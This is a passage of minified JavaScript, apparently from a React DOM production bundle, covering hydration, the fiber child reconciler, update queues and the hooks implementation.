Qa(mt(t,e)),Hi}function Tf(e){var t=e.stateNode,l=e.type,a=e.memoizedProps;switch(t[je]=e,t[Ke]=a,l){case"dialog":F("cancel",t),F("close",t);break;case"iframe":case"object":case"embed":F("load",t);break;case"video":case"audio":for(l=0;l<hn.length;l++)F(hn[l],t);break;case"source":F("error",t);break;case"img":case"image":case"link":F("error",t),F("load",t);break;case"details":F("toggle",t);break;case"input":F("invalid",t),Us(t,a.value,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name,!0);break;case"select":F("invalid",t);break;case"textarea":F("invalid",t),ws(t,a.value,a.defaultValue,a.children)}l=a.children,typeof l!="string"&&typeof l!="number"&&typeof l!="bigint"||t.textContent===""+l||a.suppressHydrationWarning===!0||qr(t.textContent,l)?(a.popover!=null&&(F("beforetoggle",t),F("toggle",t)),a.onScroll!=null&&F("scroll",t),a.onScrollEnd!=null&&F("scrollend",t),a.onClick!=null&&(t.onclick=jt),t=!0):t=!1,t||nl(e,!0)}function Af(e){for(Be=e.return;Be;)switch(Be.tag){case 5:case 31:case 13:pt=!1;return;case 27:case 3:pt=!0;return;default:Be=Be.return}}function ia(e){if(e!==Be)return!1;if(!ee)return Af(e),ee=!0,!1;var t=e.tag,l;if((l=t!==3&&t!==27)&&((l=t===5)&&(l=e.type,l=!(l!=="form"&&l!=="button")||Kc(e.type,e.memoizedProps)),l=!l),l&&ve&&nl(e),Af(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(y(317));ve=Jr(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(y(317));ve=Jr(e)}else t===27?(t=ve,pl(e.type)?(e=Ic,Ic=null,ve=e):ve=t):ve=Be?bt(e.stateNode.nextSibling):null;return!0}function Ul(){ve=Be=null,ee=!1}function Ni(){var e=al;return e!==null&&(Ie===null?Ie=e:Ie.push.apply(Ie,e),al=null),e}function Qa(e){al===null?al=[e]:al.push(e)}var Mi=o(null),Rl=null,Lt=null;function ul(e,t,l){C(Mi,t._currentValue),t._currentValue=l}function kt(e){e._currentValue=Mi.current,A(Mi)}function xi(e,t,l){for(;e!==null;){var a=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,a!==null&&(a.childLanes|=t)):a!==null&&(a.childLanes&t)!==t&&(a.childLanes|=t),e===l)break;e=e.return}}function Ui(e,t,l,a){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var u=n.dependencies;if(u!==null){var i=n.child;u=u.firstContext;e:for(;u!==null;){var c=u;u=n;for(var s=0;s<t.length;s++)if(c.context===t[s]){u.lanes|=l,c=u.alternate,c!==null&&(c.lanes|=l),xi(u.return,l,e),a||(i=null);break e}u=c.next}}else if(n.tag===18){if(i=n.return,i===null)throw Error(y(341));i.lanes|=l,u=i.alternate,u!==null&&(u.lanes|=l),xi(i,l,e),i=null}else i=n.child;if(i!==null)i.return=n;else for(i=n;i!==null;){if(i===e){i=null;break}if(n=i.sibling,n!==null){n.return=i.return,i=n;break}i=i.return}n=i}}function ca(e,t,l,a){e=null;for(var n=t,u=!1;n!==null;){if(!u){if((n.flags&524288)!==0)u=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var i=n.alternate;if(i===null)throw Error(y(387));if(i=i.memoizedProps,i!==null){var c=n.type;nt(n.pendingProps.value,i.value)||(e!==null?e.push(c):e=[c])}}else if(n===ie.current){if(i=n.alternate,i===null)throw Error(y(387));i.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push(pn):e=[pn])}n=n.return}e!==null&&Ui(t,e,l,a),t.flags|=262144}function Kn(e){for(e=e.firstContext;e!==null;){if(!nt(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function wl(e){Rl=e,Lt=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function Ye(e){return Ef(Rl,e)}function Jn(e,t){return Rl===null&&wl(e),Ef(e,t)}function Ef(e,t){var l=t._currentValue;if(t={context:t,memoizedValue:l,next:null},Lt===null){if(e===null)throw Error(y(308));Lt=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else Lt=Lt.next=t;return l}var qh=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(l,a){e.push(a)}};this.abort=function(){t.aborted=!0,e.forEach(function(l){return l()})}},Lh=z.unstable_scheduleCallback,kh=z.unstable_NormalPriority,De={$$typeof:Ee,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Ri(){return{controller:new qh,data:new Map,refCount:0}}function Va(e){e.refCount--,e.refCount===0&&Lh(kh,function(){e.controller.abort()})}var Za=null,wi=0,sa=0,fa=null;function Gh(e,t){if(Za===null){var l=Za=[];wi=0,sa=Yc(),fa={status:"pending",value:void 0,then:function(a){l.push(a)}}}return wi++,t.then(zf,zf),t}function zf(){if(--wi===0&&Za!==null){fa!==null&&(fa.status="fulfilled");var e=Za;Za=null,sa=0,fa=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function Xh(e,t){var l=[],a={status:"pending",value:null,reason:null,then:function(n){l.push(n)}};return e.then(function(){a.status="fulfilled",a.value=t;for(var n=0;n<l.length;n++)(0,l[n])(t)},function(n){for(a.status="rejected",a.reason=n,n=0;n<l.length;n++)(0,l[n])(void 0)}),a}var Of=S.S;S.S=function(e,t){fr=tt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&Gh(e,t),Of!==null&&Of(e,t)};var jl=o(null);function ji(){var e=jl.current;return e!==null?e:me.pooledCache}function Wn(e,t){t===null?C(jl,jl.current):C(jl,t.pool)}function Cf(){var e=ji();return e===null?null:{parent:De._currentValue,pool:e}}var oa=Error(y(460)),Bi=Error(y(474)),Fn=Error(y(542)),$n={then:function(){}};function _f(e){return e=e.status,e==="fulfilled"||e==="rejected"}function Df(e,t,l){switch(l=e[l],l===void 0?e.push(t):l!==t&&(t.then(jt,jt),t=l),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Nf(e),e;default:if(typeof t.status=="string")t.then(jt,jt);else{if(e=me,e!==null&&100<e.shellSuspendCounter)throw Error(y(482));e=t,e.status="pending",e.then(function(a){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=a}},function(a){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=a}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Nf(e),e}throw Yl=t,oa}}function Bl(e){try{var t=e._init;return t(e._payload)}catch(l){throw l!==null&&typeof l=="object"&&typeof l.then=="function"?(Yl=l,oa):l}}var Yl=null;function Hf(){if(Yl===null)throw Error(y(459));var e=Yl;return Yl=null,e}function Nf(e){if(e===oa||e===Fn)throw Error(y(483))}var ra=null,Ka=0;function In(e){var t=Ka;return Ka+=1,ra===null&&(ra=[]),Df(ra,e,t)}function Ja(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Pn(e,t){throw t.$$typeof===he?Error(y(525)):(e=Object.prototype.toString.call(t),Error(y(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function Mf(e){function t(r,f){if(e){var d=r.deletions;d===null?(r.deletions=[f],r.flags|=16):d.push(f)}}function l(r,f){if(!e)return null;for(;f!==null;)t(r,f),f=f.sibling;return null}function a(r){for(var f=new Map;r!==null;)r.key!==null?f.set(r.key,r):f.set(r.index,r),r=r.sibling;return f}function n(r,f){return r=Yt(r,f),r.index=0,r.sibling=null,r}function u(r,f,d){return r.index=d,e?(d=r.alternate,d!==null?(d=d.index,d<f?(r.flags|=67108866,f):d):(r.flags|=67108866,f)):(r.flags|=1048576,f)}function i(r){return e&&r.alternate===null&&(r.flags|=67108866),r}function c(r,f,d,b){return f===null||f.tag!==6?(f=Oi(d,r.mode,b),f.return=r,f):(f=n(f,d),f.return=r,f)}function s(r,f,d,b){var w=d.type;return w===H?p(r,f,d.props.children,b,d.key):f!==null&&(f.elementType===w||typeof w=="object"&&w!==null&&w.$$typeof===ze&&Bl(w)===f.type)?(f=n(f,d.props),Ja(f,d),f.return=r,f):(f=Vn(d.type,d.key,d.props,null,r.mode,b),Ja(f,d),f.return=r,f)}function h(r,f,d,b){return f===null||f.tag!==4||f.stateNode.containerInfo!==d.containerInfo||f.stateNode.implementation!==d.implementation?(f=Ci(d,r.mode,b),f.return=r,f):(f=n(f,d.children||[]),f.return=r,f)}function p(r,f,d,b,w){return f===null||f.tag!==7?(f=xl(d,r.mode,b,w),f.return=r,f):(f=n(f,d),f.return=r,f)}function T(r,f,d){if(typeof f=="string"&&f!==""||typeof f=="number"||typeof f=="bigint")return f=Oi(""+f,r.mode,d),f.return=r,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case ke:return d=Vn(f.type,f.key,f.props,null,r.mode,d),Ja(d,f),d.return=r,d;case Ge:return f=Ci(f,r.mode,d),f.return=r,f;case ze:return f=Bl(f),T(r,f,d)}if(Et(f)||Xe(f))return f=xl(f,r.mode,d,null),f.return=r,f;if(typeof f.then=="function")return T(r,In(f),d);if(f.$$typeof===Ee)return T(r,Jn(r,f),d);Pn(r,f)}return null}function m(r,f,d,b){var w=f!==null?f.key:null;if(typeof d=="string"&&d!==""||typeof d=="number"||typeof d=="bigint")return w!==null?null:c(r,f,""+d,b);if(typeof d=="object"&&d!==null){switch(d.$$typeof){case ke:return d.key===w?s(r,f,d,b):null;case Ge:return d.key===w?h(r,f,d,b):null;case ze:return d=Bl(d),m(r,f,d,b)}if(Et(d)||Xe(d))return w!==null?null:p(r,f,d,b,null);if(typeof d.then=="function")return m(r,f,In(d),b);if(d.$$typeof===Ee)return m(r,f,Jn(r,d),b);Pn(r,d)}return null}function g(r,f,d,b,w){if(typeof b=="string"&&b!==""||typeof b=="number"||typeof b=="bigint")return r=r.get(d)||null,c(f,r,""+b,w);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case ke:return r=r.get(b.key===null?d:b.key)||null,s(f,r,b,w);case Ge:return r=r.get(b.key===null?d:b.key)||null,h(f,r,b,w);case ze:return b=Bl(b),g(r,f,d,b,w)}if(Et(b)||Xe(b))return r=r.get(d)||null,p(f,r,b,w,null);if(typeof b.then=="function")return g(r,f,d,In(b),w);if(b.$$typeof===Ee)return g(r,f,d,Jn(f,b),w);Pn(f,b)}return null}function _(r,f,d,b){for(var w=null,te=null,N=f,Z=f=0,I=null;N!==null&&Z<d.length;Z++){N.index>Z?(I=N,N=null):I=N.sibling;var le=m(r,N,d[Z],b);if(le===null){N===null&&(N=I);break}e&&N&&le.alternate===null&&t(r,N),f=u(le,f,Z),te===null?w=le:te.sibling=le,te=le,N=I}if(Z===d.length)return l(r,N),ee&&qt(r,Z),w;if(N===null){for(;Z<d.length;Z++)N=T(r,d[Z],b),N!==null&&(f=u(N,f,Z),te===null?w=N:te.sibling=N,te=N);return ee&&qt(r,Z),w}for(N=a(N);Z<d.length;Z++)I=g(N,r,Z,d[Z],b),I!==null&&(e&&I.alternate!==null&&N.delete(I.key===null?Z:I.key),f=u(I,f,Z),te===null?w=I:te.sibling=I,te=I);return e&&N.forEach(function(El){return t(r,El)}),ee&&qt(r,Z),w}function B(r,f,d,b){if(d==null)throw Error(y(151));for(var w=null,te=null,N=f,Z=f=0,I=null,le=d.next();N!==null&&!le.done;Z++,le=d.next()){N.index>Z?(I=N,N=null):I=N.sibling;var El=m(r,N,le.value,b);if(El===null){N===null&&(N=I);break}e&&N&&El.alternate===null&&t(r,N),f=u(El,f,Z),te===null?w=El:te.sibling=El,te=El,N=I}if(le.done)return l(r,N),ee&&qt(r,Z),w;if(N===null){for(;!le.done;Z++,le=d.next())le=T(r,le.value,b),le!==null&&(f=u(le,f,Z),te===null?w=le:te.sibling=le,te=le);return ee&&qt(r,Z),w}for(N=a(N);!le.done;Z++,le=d.next())le=g(N,r,Z,le.value,b),le!==null&&(e&&le.alternate!==null&&N.delete(le.key===null?Z:le.key),f=u(le,f,Z),te===null?w=le:te.sibling=le,te=le);return e&&N.forEach(function(em){return t(r,em)}),ee&&qt(r,Z),w}function de(r,f,d,b){if(typeof d=="object"&&d!==null&&d.type===H&&d.key===null&&(d=d.props.children),typeof d=="object"&&d!==null){switch(d.$$typeof){case ke:e:{for(var w=d.key;f!==null;){if(f.key===w){if(w=d.type,w===H){if(f.tag===7){l(r,f.sibling),b=n(f,d.props.children),b.return=r,r=b;break e}}else if(f.elementType===w||typeof w=="object"&&w!==null&&w.$$typeof===ze&&Bl(w)===f.type){l(r,f.sibling),b=n(f,d.props),Ja(b,d),b.return=r,r=b;break e}l(r,f);break}else t(r,f);f=f.sibling}d.type===H?(b=xl(d.props.children,r.mode,b,d.key),b.return=r,r=b):(b=Vn(d.type,d.key,d.props,null,r.mode,b),Ja(b,d),b.return=r,r=b)}return i(r);case Ge:e:{for(w=d.key;f!==null;){if(f.key===w)if(f.tag===4&&f.stateNode.containerInfo===d.containerInfo&&f.stateNode.implementation===d.implementation){l(r,f.sibling),b=n(f,d.children||[]),b.return=r,r=b;break e}else{l(r,f);break}else t(r,f);f=f.sibling}b=Ci(d,r.mode,b),b.return=r,r=b}return i(r);case ze:return d=Bl(d),de(r,f,d,b)}if(Et(d))return _(r,f,d,b);if(Xe(d)){if(w=Xe(d),typeof w!="function")throw Error(y(150));return d=w.call(d),B(r,f,d,b)}if(typeof d.then=="function")return de(r,f,In(d),b);if(d.$$typeof===Ee)return de(r,f,Jn(r,d),b);Pn(r,d)}return typeof d=="string"&&d!==""||typeof d=="number"||typeof d=="bigint"?(d=""+d,f!==null&&f.tag===6?(l(r,f.sibling),b=n(f,d),b.return=r,r=b):(l(r,f),b=Oi(d,r.mode,b),b.return=r,r=b),i(r)):l(r,f)}return function(r,f,d,b){try{Ka=0;var w=de(r,f,d,b);return ra=null,w}catch(N){if(N===oa||N===Fn)throw N;var te=ut(29,N,null,r.mode);return te.lanes=b,te.return=r,te}}}var ql=Mf(!0),xf=Mf(!1),il=!1;function Yi(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function qi(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function cl(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function sl(e,t,l){var a=e.updateQueue;if(a===null)return null;if(a=a.shared,(ne&2)!==0){var n=a.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),a.pending=t,t=Qn(e),mf(e,null,l),t}return Xn(e,a,t,l),Qn(e)}function Wa(e,t,l){if(t=t.updateQueue,t!==null&&(t=t.shared,(l&4194048)!==0)){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,As(e,l)}}function Li(e,t){var l=e.updateQueue,a=e.alternate;if(a!==null&&(a=a.updateQueue,l===a)){var n=null,u=null;if(l=l.firstBaseUpdate,l!==null){do{var i={lane:l.lane,tag:l.tag,payload:l.payload,callback:null,next:null};u===null?n=u=i:u=u.next=i,l=l.next}while(l!==null);u===null?n=u=t:u=u.next=t}else n=u=t;l={baseState:a.baseState,firstBaseUpdate:n,lastBaseUpdate:u,shared:a.shared,callbacks:a.callbacks},e.updateQueue=l;return}e=l.lastBaseUpdate,e===null?l.firstBaseUpdate=t:e.next=t,l.lastBaseUpdate=t}var ki=!1;function Fa(){if(ki){var e=fa;if(e!==null)throw e}}function $a(e,t,l,a){ki=!1;var n=e.updateQueue;il=!1;var u=n.firstBaseUpdate,i=n.lastBaseUpdate,c=n.shared.pending;if(c!==null){n.shared.pending=null;var s=c,h=s.next;s.next=null,i===null?u=h:i.next=h,i=s;var p=e.alternate;p!==null&&(p=p.updateQueue,c=p.lastBaseUpdate,c!==i&&(c===null?p.firstBaseUpdate=h:c.next=h,p.lastBaseUpdate=s))}if(u!==null){var T=n.baseState;i=0,p=h=s=null,c=u;do{var m=c.lane&-536870913,g=m!==c.lane;if(g?($&m)===m:(a&m)===m){m!==0&&m===sa&&(ki=!0),p!==null&&(p=p.next={lane:0,tag:c.tag,payload:c.payload,callback:null,next:null});e:{var _=e,B=c;m=t;var de=l;switch(B.tag){case 1:if(_=B.payload,typeof _=="function"){T=_.call(de,T,m);break e}T=_;break e;case 3:_.flags=_.flags&-65537|128;case 0:if(_=B.payload,m=typeof _=="function"?_.call(de,T,m):_,m==null)break e;T=j({},T,m);break e;case 2:il=!0}}m=c.callback,m!==null&&(e.flags|=64,g&&(e.flags|=8192),g=n.callbacks,g===null?n.callbacks=[m]:g.push(m))}else g={lane:m,tag:c.tag,payload:c.payload,callback:c.callback,next:null},p===null?(h=p=g,s=T):p=p.next=g,i|=m;if(c=c.next,c===null){if(c=n.shared.pending,c===null)break;g=c,c=g.next,g.next=null,n.lastBaseUpdate=g,n.shared.pending=null}}while(!0);p===null&&(s=T),n.baseState=s,n.firstBaseUpdate=h,n.lastBaseUpdate=p,u===null&&(n.shared.lanes=0),hl|=i,e.lanes=i,e.memoizedState=T}}function Uf(e,t){if(typeof e!="function")throw Error(y(191,e));e.call(t)}function Rf(e,t){var l=e.callbacks;if(l!==null)for(e.callbacks=null,e=0;e<l.length;e++)Uf(l[e],t)}var da=o(null),eu=o(0);function wf(e,t){e=Ft,C(eu,e),C(da,t),Ft=e|t.baseLanes}function Gi(){C(eu,Ft),C(da,da.current)}function Xi(){Ft=eu.current,A(da),A(eu)}var it=o(null),St=null;function fl(e){var t=e.alternate;C(Ce,Ce.current&1),C(it,e),St===null&&(t===null||da.current!==null||t.memoizedState!==null)&&(St=e)}function Qi(e){C(Ce,Ce.current),C(it,e),St===null&&(St=e)}function jf(e){e.tag===22?(C(Ce,Ce.current),C(it,e),St===null&&(St=e)):ol()}function ol(){C(Ce,Ce.current),C(it,it.current)}function ct(e){A(it),St===e&&(St=null),A(Ce)}var Ce=o(0);function tu(e){for(var t=e;t!==null;){if(t.tag===13){var l=t.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||Fc(l)||$c(l)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Gt=0,V=null,oe=null,He=null,lu=!1,ha=!1,Ll=!1,au=0,Ia=0,ya=null,Qh=0;function be(){throw Error(y(321))}function Vi(e,t){if(t===null)return!1;for(var l=0;l<t.length&&l<e.length;l++)if(!nt(e[l],t[l]))return!1;return!0}function Zi(e,t,l,a,n,u){return Gt=u,V=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,S.H=e===null||e.memoizedState===null?bo:cc,Ll=!1,u=l(a,n),Ll=!1,ha&&(u=Yf(t,l,a,n)),Bf(e),u}function Bf(e){S.H=tn;var t=oe!==null&&oe.next!==null;if(Gt=0,He=oe=V=null,lu=!1,Ia=0,ya=null,t)throw Error(y(300));e===null||Ne||(e=e.dependencies,e!==null&&Kn(e)&&(Ne=!0))}function Yf(e,t,l,a){V=e;var n=0;do{if(ha&&(ya=null),Ia=0,ha=!1,25<=n)throw Error(y(301));if(n+=1,He=oe=null,e.updateQueue!=null){var u=e.updateQueue;u.lastEffect=null,u.events=null,u.stores=null,u.memoCache!=null&&(u.memoCache.index=0)}S.H=To,u=t(l,a)}while(ha);return u}function Vh(){var e=S.H,t=e.useState()[0];return t=typeof t.then=="function"?Pa(t):t,e=e.useState()[0],(oe!==null?oe.memoizedState:null)!==e&&(V.flags|=1024),t}function Ki(){var e=au!==0;return au=0,e}function Ji(e,t,l){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l}function Wi(e){if(lu){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}lu=!1}Gt=0,He=oe=V=null,ha=!1,Ia=au=0,ya=null}function Ze(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return He===null?V.memoizedState=He=e:He=He.next=e,He}function _e(){if(oe===null){var e=V.alternate;e=e!==null?e.memoizedState:null}else e=oe.next;var t=He===null?V.memoizedState:He.next;if(t!==null)He=t,oe=e;else{if(e===null)throw V.alternate===null?Error(y(467)):Error(y(310));oe=e,e={memoizedState:oe.memoizedState,baseState:oe.baseState,baseQueue:oe.baseQueue,queue:oe.queue,next:null},He===null?V.memoizedState=He=e:He=He.next=e}return He}function nu(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Pa(e){var t=Ia;return Ia+=1,ya===null&&(ya=[]),e=Df(ya,e,t),t=V,(He===null?t.memoizedState:He.next)===null&&(t=t.alternate,S.H=t===null||t.memoizedState===null?bo:cc),e}function uu(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return Pa(e);if(e.$$typeof===Ee)return Ye(e)}throw Error(y(438,String(e)))}function Fi(e){var t=null,l=V.updateQueue;if(l!==null&&(t=l.memoCache),t==null){var a=V.alternate;a!==null&&(a=a.updateQueue,a!==null&&(a=a.memoCache,a!=null&&(t={data:a.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),l===null&&(l=nu(),V.updateQueue=l),l.memoCache=t,l=t.data[t.index],l===void 0)for(l=t.data[t.index]=Array(e),a=0;a<e;a++)l[a]=Ht;return t.index++,l}function Xt(e,t){return typeof t=="function"?t(e):t}function iu(e){var t=_e();return $i(t,oe,e)}function $i(e,t,l){var a=e.queue;if(a===null)throw Error(y(311));a.lastRenderedReducer=l;var n=e.baseQueue,u=a.pending;if(u!==null){if(n!==null){var i=n.next;n.next=u.next,u.next=i}t.baseQueue=n=u,a.pending=null}if(u=e.baseState,n===null)e.memoizedState=u;else{t=n.next;var c=i=null,s=null,h=t,p=!1;do{var T=h.lane&-536870913;if(T!==h.lane?($&T)===T:(Gt&T)===T){var m=h.revertLane;if(m===0)s!==null&&(s=s.next={lane:0,revertLane:0,gesture:null,action:h.action,hasEagerState:h.hasEagerState,eagerState:h.eagerState,next:null}),T===sa&&(p=!0);else if((Gt&m)===m){h=h.next,m===sa&&(p=!0);continue}else T={lane:0,revertLane:h.revertLane,gesture:null,action:h.action,hasEagerState:h.hasEagerState,eagerState:h.eagerState,next:null},s===null?(c=s=T,i=u):s=s.next=T,V.lanes|=m,hl|=m;T=h.action,Ll&&l(u,T),u=h.hasEagerState?h.eagerState:l(u,T)}else m={lane:T,revertLane:h.revertLane,gesture:h.gesture,action:h.action,hasEagerState:h.hasEagerState,eagerState:h.eagerState,next:null},s===null?(c=s=m,i=u):s=s.next=m,V.lanes|=T,hl|=T;h=h.next}while(h!==null&&h!==t);if(s===null?i=u:s.next=c,!nt(u,e.memoizedState)&&(Ne=!0,p&&(l=fa,l!==null)))throw l;e.memoizedState=u,e.baseState=i,e.baseQueue=s,a.lastRenderedState=u}return n===null&&(a.lanes=0),[e.memoizedState,a.dispatch]}function Ii(e){var t=_e(),l=t.queue;if(l===null)throw Error(y(311));l.lastRenderedReducer=e;var a=l.dispatch,n=l.pending,u=t.memoizedState;if(n!==null){l.pending=null;var i=n=n.next;do u=e(u,i.action),i=i.next;while(i!==n);nt(u,t.memoizedState)||(Ne=!0),t.memoizedState=u,t.baseQueue===null&&(t.baseState=u),l.lastRenderedState=u}return[u,a]}function qf(e,t,l){var a=V,n=_e(),u=ee;if(u){if(l===void 0)throw Error(y(407));l=l()}else l=t();var i=!nt((oe||n).memoizedState,l);if(i&&(n.memoizedState=l,Ne=!0),n=n.queue,tc(Gf.bind(null,a,n,e),[e]),n.getSnapshot!==t||i||He!==null&&He.memoizedState.tag&1){if(a.flags|=2048,ma(9,{destroy:void 0},kf.bind(null,a,n,l,t),null),me===null)throw Error(y(349));u||(Gt&127)!==0||Lf(a,t,l)}return l}function Lf(e,t,l){e.flags|=16384,e={getSnapshot:t,value:l},t=V.updateQueue,t===null?(t=nu(),V.updateQueue=t,t.stores=[e]):(l=t.stores,l===null?t.stores=[e]:l.push(e))}function kf(e,t,l,a){t.value=l,t.getSnapshot=a,Xf(t)&&Qf(e)}function Gf(e,t,l){return l(function(){Xf(t)&&Qf(e)})}function Xf(e){var t=e.getSnapshot;e=e.value;try{var l=t();return!nt(e,l)}catch{return!0}}function Qf(e){var t=Ml(e,2);t!==null&&Pe(t,e,2)}function Pi(e){var t=Ze();if(typeof e=="function"){var l=e;if(e=l(),Ll){Pt(!0);try{l()}finally{Pt(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Xt,lastRenderedState:e},t}function Vf(e,t,l,a){return e.baseState=l,$i(e,oe,typeof a=="function"?a:Xt)}function Zh(e,t,l,a,n){if(fu(e))throw Error(y(485));if(e=t.action,e!==null){var u={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(i){u.listeners.push(i)}};S.T!==null?l(!0):u.isTransition=!1,a(u),l=t.pending,l===null?(u.next=t.pending=u,Zf(t,u)):(u.next=l.next,t.pending=l.next=u)}}function Zf(e,t){var l=t.action,a=t.payload,n=e.state;if(t.isTransition){var u=S.T,i={};S.T=i;try{var c=l(n,a),s=S.S;s!==null&&s(i,c),Kf(e,t,c)}catch(h){ec(e,t,h)}finally{u!==null&&i.types!==null&&(u.types=i.types),S.T=u}}else try{u=l(n,a),Kf(e,t,u)}catch(h){ec(e,t,h)}}function Kf(e,t,l){l!==null&&typeof l=="object"&&typeof l.then=="function"?l.then(function(a){Jf(e,t,a)},function(a){return ec(e,t,a)}):Jf(e,t,l)}function Jf(e,t,l){t.status="fulfilled",t.value=l,Wf(t),e.state=l,t=e.pending,t!==null&&(l=t.next,l===t?e.pending=null:(l=l.next,t.next=l,Zf(e,l)))}function ec(e,t,l){var a=e.pending;if(e.pending=null,a!==null){a=a.next;do t.status="rejected",t.reason=l,Wf(t),t=t.next;while(t!==a)}e.action=null}function Wf(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function Ff(e,t){return t}function $f(e,t){if(ee){var l=me.formState;if(l!==null){e:{var a=V;if(ee){if(ve){t:{for(var n=ve,u=pt;n.nodeType!==8;){if(!u){n=null;break t}if(n=bt(n.nextSibling),n===null){n=null;break t}}u=n.data,n=u==="F!"||u==="F"?n:null}if(n){ve=bt(n.nextSibling),a=n.data==="F!";break e}}nl(a)}a=!1}a&&(t=l[0])}}return l=Ze(),l.memoizedState=l.baseState=t,a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ff,lastRenderedState:t},l.queue=a,l=vo.bind(null,V,a),a.dispatch=l,a=Pi(!1),u=ic.bind(null,V,!1,a.queue),a=Ze(),n={state:t,dispatch:null,action:e,pending:null},a.queue=n,l=Zh.bind(null,V,n,u,l),n.dispatch=l,a.memoizedState=e,[t,l,!1]}function If(e){var t=_e();return Pf(t,oe,e)}function Pf(e,t,l){if(t=$i(e,t,Ff)[0],e=iu(Xt)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var a=Pa(t)}catch(i){throw i===oa?Fn:i}else a=t;t=_e();var n=t.queue,u=n.dispatch;return l!==t.memoizedState&&(V.flags|=2048,ma(9,{destroy:void 0},Kh.bind(null,n,l),null)),[a,u,e]}function Kh(e,t){e.action=t}function eo(e){var t=_e(),l=oe;if(l!==null)return Pf(t,l,e);_e(),t=t.memoizedState,l=_e();var a=l.queue.dispatch;return l.memoizedState=e,[t,a,!1]}function ma(e,t,l,a){return e={tag:e,create:l,deps:a,inst:t,next:null},t=V.updateQueue,t===null&&(t=nu(),V.updateQueue=t),l=t.lastEffect,l===null?t.lastEffect=e.next=e:(a=l.next,l.next=e,e.next=a,t.lastEffect=e),e}function to(){return _e().memoizedState}function cu(e,t,l,a){var n=Ze();V.flags|=e,n.memoizedState=ma(1|t,{destroy:void 0},l,a===void 0?null:a)}function su(e,t,l,a){var n=_e();a=a===void 0?null:a;var u=n.memoizedState.inst;oe!==null&&a!==null&&Vi(a,oe.memoizedState.deps)?n.memoizedState=ma(t,u,l,a):(V.flags|=e,n.memoizedState=ma(1|t,u,l,a))}function lo(e,t){cu(8390656,8,e,t)}function tc(e,t){su(2048,8,e,t)}function Jh(e){V.flags|=4;var t=V.updateQueue;if(t===null)t=nu(),V.updateQueue=t,t.events=[e];else{var l=t.events;l===null?t.events=[e]:l.push(e)}}function ao(e){var t=_e().memoizedState;return Jh({ref:t,nextImpl:e}),function(){if((ne&2)!==0)throw Error(y(440));return t.impl.apply(void 0,arguments)}}function no(e,t){return su(4,2,e,t)}function uo(e,t){return su(4,4,e,t)}function io(e,t){if(typeof t=="function"){e=e();var l=t(e);return function(){typeof l=="function"?l():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function co(e,t,l){l=l!=null?l.concat([e]):null,su(4,4,io.bind(null,t,e),l)}function lc(){}function so(e,t){var l=_e();t=t===void 0?null:t;var a=l.memoizedState;return t!==null&&Vi(t,a[1])?a[0]:(l.memoizedState=[e,t],e)}function fo(e,t){var l=_e();t=t===void 0?null:t;var a=l.memoizedState;if(t!==null&&Vi(t,a[1]))return a[0];if(a=e(),Ll){Pt(!0);try{e()}finally{Pt(!1)}}return l.memoizedState=[a,t],a}function ac(e,t,l){return l===void 0||(Gt&1073741824)!==0&&($&261930)===0?e.memoizedState=t:(e.memoizedState=l,e=rr(),V.lanes|=e,hl|=e,l)}function oo(e,t,l,a){return 